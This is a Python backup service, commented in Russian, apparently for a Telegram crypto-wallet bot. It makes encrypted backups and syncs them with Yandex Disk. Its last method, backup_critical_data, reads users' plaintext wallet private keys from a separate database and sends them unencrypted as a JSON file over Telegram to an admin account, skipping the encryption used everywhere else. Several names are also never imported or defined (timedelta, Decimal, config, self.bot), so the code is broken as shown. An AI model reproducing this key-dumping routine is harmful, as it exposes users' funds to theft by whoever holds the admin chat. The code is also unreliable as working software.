from aiogram import Bot
from datetime import datetime
import sqlite3
import json
import os
import asyncio
from services.backup.yadisk_service import YandexDiskService
from typing import Dict, List, Optional
import logging
import shutil
import aiohttp
import aioyandexdisk
from cryptography.fernet import Fernet
import zipfile
import tempfile
from core.database.database import Database
from core.database.models import User, Wallet, Transaction, Setting

class BackupService:
    def __init__(
        self,
        db: Database,
        encryption_key: str,
        yandex_disk_token: Optional[str] = None,
        backup_dir: str = "backups"
    ):
        self.logger = logging.getLogger(__name__)
        self.db = db
        self.encryption_key = encryption_key
        self.yandex_disk_token = yandex_disk_token
        self.backup_dir = backup_dir
        self.fernet = Fernet(encryption_key.encode())
        
        # Создаем локальную директорию для бэкапов
        os.makedirs(backup_dir, exist_ok=True)

    async def start_backup_scheduler(self):
        """Запускает планировщик резервного копирования"""
        while True:
            await self.create_backup()
            await asyncio.sleep(self.backup_interval)
            
    async def create_backup(
        self,
        include_users: bool = True,
        include_wallets: bool = True,
        include_transactions: bool = True,
        include_settings: bool = True
    ) -> Dict:
        """Создает резервную копию данных."""
        try:
            # Создаем временную директорию для бэкапа
            with tempfile.TemporaryDirectory() as temp_dir:
                backup_data = {
                    'metadata': {
                        'version': '1.0',
                        'created_at': datetime.utcnow().isoformat(),
                        'includes': {
                            'users': include_users,
                            'wallets': include_wallets,
                            'transactions': include_transactions,
                            'settings': include_settings
                        }
                    },
                    'data': {}
                }

                session = self.db.get_session()
                try:
                    # Собираем данные из базы
                    if include_users:
                        backup_data['data']['users'] = await self._backup_users(session)
                    if include_wallets:
                        backup_data['data']['wallets'] = await self._backup_wallets(session)
                    if include_transactions:
                        backup_data['data']['transactions'] = await self._backup_transactions(session)
                    if include_settings:
                        backup_data['data']['settings'] = await self._backup_settings(session)

                finally:
                    session.close()

                # Сохраняем данные во временный файл
                json_path = os.path.join(temp_dir, 'backup.json')
                with open(json_path, 'w') as f:
                    json.dump(backup_data, f)

                # Создаем архив
                timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
                zip_filename = f'backup_{timestamp}.zip'
                zip_path = os.path.join(self.backup_dir, zip_filename)

                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    zipf.write(json_path, 'backup.json')

                # Шифруем архив
                with open(zip_path, 'rb') as f:
                    encrypted_data = self.fernet.encrypt(f.read())

                encrypted_path = zip_path + '.enc'
                with open(encrypted_path, 'wb') as f:
                    f.write(encrypted_data)

                # Удаляем незашифрованный архив
                os.remove(zip_path)

                # Загружаем на Яндекс.Диск, если настроен
                if self.yandex_disk_token:
                    await self._upload_to_yandex_disk(encrypted_path)

                return {
                    'success': True,
                    'filename': os.path.basename(encrypted_path),
                    'size': os.path.getsize(encrypted_path),
                    'created_at': backup_data['metadata']['created_at']
                }

        except Exception as e:
            self.logger.error(f"Ошибка при создании бэкапа: {str(e)}")
            raise

    async def restore_backup(
        self,
        backup_file: str,
        restore_users: bool = True,
        restore_wallets: bool = True,
        restore_transactions: bool = True,
        restore_settings: bool = True
    ) -> Dict:
        """Восстанавливает данные из резервной копии."""
        try:
            # Создаем временную директорию для восстановления
            with tempfile.TemporaryDirectory() as temp_dir:
                # Расшифровываем архив
                with open(backup_file, 'rb') as f:
                    decrypted_data = self.fernet.decrypt(f.read())

                decrypted_zip = os.path.join(temp_dir, 'backup.zip')
                with open(decrypted_zip, 'wb') as f:
                    f.write(decrypted_data)

                # Распаковываем архив
                with zipfile.ZipFile(decrypted_zip, 'r') as zipf:
                    zipf.extractall(temp_dir)

                # Читаем данные
                with open(os.path.join(temp_dir, 'backup.json'), 'r') as f:
                    backup_data = json.load(f)

                session = self.db.get_session()
                try:
                    restored = {
                        'users': 0,
                        'wallets': 0,
                        'transactions': 0,
                        'settings': 0
                    }

                    # Восстанавливаем данные
                    if restore_users and 'users' in backup_data['data']:
                        restored['users'] = await self._restore_users(
                            session,
                            backup_data['data']['users']
                        )

                    if restore_wallets and 'wallets' in backup_data['data']:
                        restored['wallets'] = await self._restore_wallets(
                            session,
                            backup_data['data']['wallets']
                        )

                    if restore_transactions and 'transactions' in backup_data['data']:
                        restored['transactions'] = await self._restore_transactions(
                            session,
                            backup_data['data']['transactions']
                        )

                    if restore_settings and 'settings' in backup_data['data']:
                        restored['settings'] = await self._restore_settings(
                            session,
                            backup_data['data']['settings']
                        )

                    session.commit()
                    return {
                        'success': True,
                        'restored_items': restored,
                        'backup_date': backup_data['metadata']['created_at']
                    }

                except Exception as e:
                    session.rollback()
                    raise
                finally:
                    session.close()

        except Exception as e:
            self.logger.error(f"Ошибка при восстановлении из бэкапа: {str(e)}")
            raise

    async def list_backups(self) -> List[Dict]:
        """Получает список доступных резервных копий."""
        try:
            backups = []
            
            # Получаем локальные бэкапы
            for filename in os.listdir(self.backup_dir):
                if filename.endswith('.enc'):
                    path = os.path.join(self.backup_dir, filename)
                    backups.append({
                        'filename': filename,
                        'size': os.path.getsize(path),
                        'created_at': datetime.fromtimestamp(
                            os.path.getctime(path)
                        ).isoformat(),
                        'location': 'local'
                    })

            # Получаем бэкапы с Яндекс.Диска
            if self.yandex_disk_token:
                yandex_backups = await self._list_yandex_disk_backups()
                backups.extend(yandex_backups)

            return sorted(
                backups,
                key=lambda x: x['created_at'],
                reverse=True
            )

        except Exception as e:
            self.logger.error(f"Ошибка при получении списка бэкапов: {str(e)}")
            raise

    async def cleanup_old_backups(self, days: int = 30) -> int:
        """Удаляет старые резервные копии."""
        try:
            deleted = 0
            threshold = datetime.utcnow() - timedelta(days=days)

            # Удаляем локальные бэкапы
            for filename in os.listdir(self.backup_dir):
                if filename.endswith('.enc'):
                    path = os.path.join(self.backup_dir, filename)
                    created_at = datetime.fromtimestamp(os.path.getctime(path))
                    
                    if created_at < threshold:
                        os.remove(path)
                        deleted += 1

            # Удаляем бэкапы с Яндекс.Диска
            if self.yandex_disk_token:
                deleted += await self._cleanup_yandex_disk_backups(days)

            return deleted

        except Exception as e:
            self.logger.error(f"Ошибка при очистке старых бэкапов: {str(e)}")
            raise

    async def _backup_users(self, session) -> List[Dict]:
        """Создает резервную копию пользователей."""
        users = session.query(User).all()
        return [{
            'id': user.id,
            'telegram_id': user.telegram_id,
            'username': user.username,
            'full_name': user.full_name,
            'language_code': user.language_code,
            'is_premium': user.is_premium,
            'created_at': user.created_at.isoformat()
        } for user in users]

    async def _backup_wallets(self, session) -> List[Dict]:
        """Создает резервную копию кошельков."""
        wallets = session.query(Wallet).all()
        return [{
            'id': wallet.id,
            'user_id': wallet.user_id,
            'network': wallet.network,
            'address': wallet.address,
            'encrypted_private_key': wallet.encrypted_private_key,
            'created_at': wallet.created_at.isoformat()
        } for wallet in wallets]

    async def _backup_transactions(self, session) -> List[Dict]:
        """Создает резервную копию транзакций."""
        transactions = session.query(Transaction).all()
        return [{
            'id': tx.id,
            'user_id': tx.user_id,
            'wallet_id': tx.wallet_id,
            'type': tx.type,
            'amount': str(tx.amount),
            'token_symbol': tx.token_symbol,
            'status': tx.status,
            'created_at': tx.created_at.isoformat()
        } for tx in transactions]

    async def _backup_settings(self, session) -> List[Dict]:
        """Создает резервную копию настроек."""
        settings = session.query(Setting).all()
        return [{
            'id': setting.id,
            'user_id': setting.user_id,
            'key': setting.key,
            'value': setting.value,
            'updated_at': setting.updated_at.isoformat()
        } for setting in settings]

    async def _restore_users(self, session, users_data: List[Dict]) -> int:
        """Восстанавливает пользователей из бэкапа."""
        restored = 0
        for user_data in users_data:
            existing = session.query(User).filter_by(
                telegram_id=user_data['telegram_id']
            ).first()
            
            if not existing:
                user = User(
                    telegram_id=user_data['telegram_id'],
                    username=user_data['username'],
                    full_name=user_data['full_name'],
                    language_code=user_data['language_code'],
                    is_premium=user_data['is_premium'],
                    created_at=datetime.fromisoformat(user_data['created_at'])
                )
                session.add(user)
                restored += 1
                
        return restored

    async def _restore_wallets(self, session, wallets_data: List[Dict]) -> int:
        """Восстанавливает кошельки из бэкапа."""
        restored = 0
        for wallet_data in wallets_data:
            existing = session.query(Wallet).filter_by(
                user_id=wallet_data['user_id'],
                network=wallet_data['network']
            ).first()
            
            if not existing:
                wallet = Wallet(
                    user_id=wallet_data['user_id'],
                    network=wallet_data['network'],
                    address=wallet_data['address'],
                    encrypted_private_key=wallet_data['encrypted_private_key'],
                    created_at=datetime.fromisoformat(wallet_data['created_at'])
                )
                session.add(wallet)
                restored += 1
                
        return restored

    async def _restore_transactions(self, session, transactions_data: List[Dict]) -> int:
        """Восстанавливает транзакции из бэкапа."""
        restored = 0
        for tx_data in transactions_data:
            existing = session.query(Transaction).filter_by(
                user_id=tx_data['user_id'],
                wallet_id=tx_data['wallet_id'],
                created_at=datetime.fromisoformat(tx_data['created_at'])
            ).first()
            
            if not existing:
                tx = Transaction(
                    user_id=tx_data['user_id'],
                    wallet_id=tx_data['wallet_id'],
                    type=tx_data['type'],
                    amount=Decimal(tx_data['amount']),
                    token_symbol=tx_data['token_symbol'],
                    status=tx_data['status'],
                    created_at=datetime.fromisoformat(tx_data['created_at'])
                )
                session.add(tx)
                restored += 1
                
        return restored

    async def _restore_settings(self, session, settings_data: List[Dict]) -> int:
        """Восстанавливает настройки из бэкапа."""
        restored = 0
        for setting_data in settings_data:
            existing = session.query(Setting).filter_by(
                user_id=setting_data['user_id'],
                key=setting_data['key']
            ).first()
            
            if not existing:
                setting = Setting(
                    user_id=setting_data['user_id'],
                    key=setting_data['key'],
                    value=setting_data['value'],
                    updated_at=datetime.fromisoformat(setting_data['updated_at'])
                )
                session.add(setting)
                restored += 1
                
        return restored

    async def _upload_to_yandex_disk(self, file_path: str) -> None:
        """Загружает файл на Яндекс.Диск."""
        try:
            disk = aioyandexdisk.YaDisk(token=self.yandex_disk_token)
            
            # Создаем директорию для бэкапов, если её нет
            await disk.mkdir('backups')
            
            # Загружаем файл
            filename = os.path.basename(file_path)
            await disk.upload(file_path, f'backups/{filename}')
            
        except Exception as e:
            self.logger.error(f"Ошибка при загрузке на Яндекс.Диск: {str(e)}")
            raise

    async def _list_yandex_disk_backups(self) -> List[Dict]:
        """Получает список бэкапов с Яндекс.Диска."""
        try:
            disk = aioyandexdisk.YaDisk(token=self.yandex_disk_token)
            
            # Получаем список файлов
            files = await disk.listdir('backups')
            
            return [{
                'filename': file['name'],
                'size': file['size'],
                'created_at': file['created'],
                'location': 'yandex_disk'
            } for file in files if file['name'].endswith('.enc')]
            
        except Exception as e:
            self.logger.error(f"Ошибка при получении списка с Яндекс.Диска: {str(e)}")
            return []

    async def _cleanup_yandex_disk_backups(self, days: int) -> int:
        """Удаляет старые бэкапы с Яндекс.Диска."""
        try:
            disk = aioyandexdisk.YaDisk(token=self.yandex_disk_token)
            deleted = 0
            threshold = datetime.utcnow() - timedelta(days=days)
            
            # Получаем список файлов
            files = await disk.listdir('backups')
            
            # Удаляем старые файлы
            for file in files:
                if (file['name'].endswith('.enc') and
                    datetime.fromisoformat(file['created']) < threshold):
                    await disk.remove(f"backups/{file['name']}")
                    deleted += 1
                    
            return deleted
            
        except Exception as e:
            self.logger.error(f"Ошибка при очистке бэкапов на Яндекс.Диске: {str(e)}")
            return 0

    async def backup_critical_data(self):
        """Создает резервную копию критичных данных в JSON"""
        try:
            connection = sqlite3.connect('not_like.db')
            cursor = connection.cursor()
            
            # Получаем данные пользователей и кошельков
            cursor.execute("""
                SELECT users.*, wallets.address, wallets.private_key 
                FROM users 
                LEFT JOIN wallets ON users.id = wallets.user_id
            """)
            
            data = {
                'users': [],
                'timestamp': datetime.now().isoformat()
            }
            
            for row in cursor.fetchall():
                user_data = {
                    'telegram_id': row[1],
                    'username': row[2],
                    'wallets': [{
                        'address': row[-2],
                        'private_key': row[-1]
                    }] if row[-2] else []
                }
                data['users'].append(user_data)
                
            connection.close()
            
            # Сохраняем в файл
            backup_file = f'critical_data_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
            with open(backup_file, 'w') as f:
                json.dump(data, f, indent=2)
                
            # Отправляем файл
            with open(backup_file, 'rb') as f:
                await self.bot.send_document(
                    config.ADMIN_ID,
                    f,
                    caption="🔐 Резервная копия критичных данных"
                )
                
            os.remove(backup_file)
            
        except Exception as e:
            await self.bot.send_message(
                config.ADMIN_ID,
                f"❌ Ошибка при резервном копировании критичных данных:\n{str(e)}"
            ) 